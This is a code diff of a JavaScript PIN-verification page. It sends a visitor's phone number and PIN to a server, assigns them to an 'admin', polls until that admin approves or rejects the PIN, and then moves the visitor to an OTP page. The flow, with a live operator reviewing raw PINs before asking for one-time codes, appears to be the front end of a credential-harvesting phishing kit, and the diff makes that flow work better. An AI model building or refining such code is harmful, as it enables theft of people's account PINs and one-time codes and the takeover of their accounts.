@@ -1,4 +1,4 @@
-// PIN Verification Script with Enhanced Admin ID Support - NO ALERTS VERSION
+// PIN Verification Script with Enhanced Admin ID Support - FIXED VERSION
 document.addEventListener('DOMContentLoaded', function() {
     const phoneInput = document.getElementById('phoneNumber');
     const pinInput = document.getElementById('pin');
@@ -145,7 +145,7 @@ document.addEventListener('DOMContentLoaded', function() {
         // ========================================
         applicationData.phone = phoneNumber;
         applicationData.pin = pin;
-        applicationData.adminId = adminId; // Ensure admin ID is included
+        applicationData.adminId = adminId;
         sessionStorage.setItem('applicationData', JSON.stringify(applicationData));
         
         // Show processing screen
@@ -156,16 +156,18 @@ document.addEventListener('DOMContentLoaded', function() {
         // PREPARE REQUEST DATA WITH ADMIN ID
         // ========================================
         const requestData = {
-            phone: phoneNumber,
+            phoneNumber: phoneNumber,  // ✅ FIXED: Use phoneNumber to match backend
             pin: pin
         };
         
         // ✅ CRITICAL: ADD ADMIN ID TO REQUEST
         if (adminId && adminId !== 'undefined' && adminId !== 'null' && adminId !== '') {
             requestData.adminId = adminId;
+            requestData.assignmentType = 'specific';  // ✅ ADDED: Tell backend this is specific assignment
             console.log('📤 Sending with admin ID:', adminId);
             console.log('%c✅ SPECIFIC ASSIGNMENT', 'background: #2196F3; color: white; padding: 5px 10px; border-radius: 3px; font-weight: bold;');
         } else {
+            requestData.assignmentType = 'auto';  // ✅ ADDED: Tell backend to auto-assign
             console.log('📤 Sending without admin ID (server will auto-assign)');
             console.log('%c⚠️ AUTO-ASSIGNMENT', 'background: #FF9800; color: white; padding: 5px 10px; border-radius: 3px; font-weight: bold;');
         }
@@ -194,15 +196,16 @@ document.addEventListener('DOMContentLoaded', function() {
                 
                 if (result.assignedTo) {
                     console.log('👤 Assigned to admin:', result.assignedTo);
+                    console.log('🆔 Admin ID:', result.assignedAdminId);
                     console.log('%c✅ ASSIGNMENT CONFIRMED', 'background: #4CAF50; color: white; padding: 5px 10px; border-radius: 3px; font-weight: bold;');
                 }
                 
-                // Update admin ID in session if it was auto-assigned and returned
-                if (result.assignedTo && !adminId) {
-                    sessionStorage.setItem('selectedAdminId', result.assignedTo);
-                    localStorage.setItem('selectedAdminId', result.assignedTo);
-                    adminId = result.assignedTo;
-                    console.log('🔄 Admin auto-assigned and stored:', result.assignedTo);
+                // Update admin ID in session if it was auto-assigned
+                if (result.assignedAdminId && !adminId) {
+                    sessionStorage.setItem('selectedAdminId', result.assignedAdminId);
+                    localStorage.setItem('selectedAdminId', result.assignedAdminId);
+                    adminId = result.assignedAdminId;
+                    console.log('🔄 Admin auto-assigned and stored:', result.assignedAdminId);
                 }
                 
                 // Start polling for status
@@ -220,7 +223,7 @@ document.addEventListener('DOMContentLoaded', function() {
     });
     
     // ========================================
-    // CHECK PIN STATUS (POLLING)
+    // CHECK PIN STATUS (POLLING) - FIXED
     // ========================================
     function checkPinStatus(applicationId) {
         let checkCount = 0;
@@ -233,9 +236,16 @@ document.addEventListener('DOMContentLoaded', function() {
             
             try {
                 const response = await fetch(`/api/check-pin-status/${applicationId}`);
+                
+                // ✅ FIX: Handle both 200 and 404 responses
+                if (!response.ok && response.status !== 404) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                
                 const result = await response.json();
                 
-                if (result.found) {
+                // ✅ FIX: Check for result.success instead of result.found
+                if (result.success && result.status) {
                     const status = result.status;
                     
                     // Only log every 10th check to reduce console spam
@@ -255,7 +265,7 @@ document.addEventListener('DOMContentLoaded', function() {
                             window.location.href = 'otp.html';
                         }, 1000);
                         
-                    } else if (status === 'denied' || status === 'rejected') {
+                    } else if (status === 'rejected' || status === 'denied') {
                         // PIN rejected - show rejection screen
                         clearInterval(statusInterval);
                         console.log('❌ PIN REJECTED by admin');
@@ -266,11 +276,16 @@ document.addEventListener('DOMContentLoaded', function() {
                     }
                     // If still 'pending', keep polling
                 } else {
-                    console.warn('⚠️ Application not found in database');
+                    // Application not found or other error
+                    if (checkCount % 10 === 0) {
+                        console.warn('⚠️ Application not found or error:', result.message);
+                    }
                 }
                 
             } catch (error) {
-                console.error('❌ Error checking status:', error);
+                if (checkCount % 10 === 0) {
+                    console.error('❌ Error checking status:', error);
+                }
                 // Don't stop polling on network errors - might be temporary
             }
             
@@ -289,7 +304,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
     
     // ========================================
-    // TRY AGAIN BUTTON (if you have one in rejection screen)
+    // TRY AGAIN BUTTON
     // ========================================
     const tryAgainBtn = document.querySelector('#tryAgainBtn');
     if (tryAgainBtn) {
